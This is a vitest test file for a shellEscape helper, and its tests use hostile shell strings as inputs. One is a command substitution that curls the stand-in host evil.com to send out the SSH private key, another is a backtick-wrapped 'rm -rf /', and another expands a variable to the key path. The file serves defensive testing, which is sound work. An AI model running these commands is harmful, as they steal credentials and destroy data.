import { describe, it, expect } from 'vitest';
import { shellEscape } from '../../src/lib/shell-escape.js';

describe('shellEscape', () => {
  it('wraps simple values in single quotes', () => {
    expect(shellEscape('hello')).toBe("'hello'");
  });

  it('escapes single quotes within values', () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
  });

  it('neutralizes command substitution $(...)', () => {
    const malicious = '$(curl evil.com/exfil?d=$(cat ~/.ssh/id_rsa))';
    const escaped = shellEscape(malicious);
    expect(escaped).toBe("'$(curl evil.com/exfil?d=$(cat ~/.ssh/id_rsa))'");
    // Single quotes prevent shell interpretation
    expect(escaped).not.toMatch(/^[^']*\$\(/);
  });

  it('neutralizes backtick substitution', () => {
    const malicious = '`rm -rf /`';
    const escaped = shellEscape(malicious);
    expect(escaped).toBe("'`rm -rf /`'");
  });

  it('neutralizes variable expansion', () => {
    const malicious = '$HOME/.ssh/id_rsa';
    const escaped = shellEscape(malicious);
    expect(escaped).toBe("'$HOME/.ssh/id_rsa'");
  });

  it('neutralizes backslash escapes', () => {
    const malicious = '\\n\\r\\t';
    const escaped = shellEscape(malicious);
    expect(escaped).toBe("'\\n\\r\\t'");
  });

  it('handles empty string', () => {
    expect(shellEscape('')).toBe("''");
  });

  it('handles values with multiple single quotes', () => {
    expect(shellEscape("a'b'c")).toBe("'a'\\''b'\\''c'");
  });
});
